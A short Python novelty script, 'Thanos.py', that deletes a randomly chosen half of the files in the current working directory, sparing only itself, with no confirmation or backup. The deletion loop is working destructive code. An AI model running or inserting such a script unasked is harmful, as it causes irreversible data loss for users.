# -------------------------------------------
# Thanos.py: Decimation for your files      |
# -------------------------------------------

import os
import random
mydir = os.getcwd()
filelist = [f for f in os.listdir(mydir)]
random.shuffle(filelist)
length_ = round(len(filelist)/2)
filelist = filelist[:length_]
for f in filelist:
    if f.endswith("Thanos.py"):
        pass
    else:
        print(f)
        os.remove(os.path.join(mydir, f))
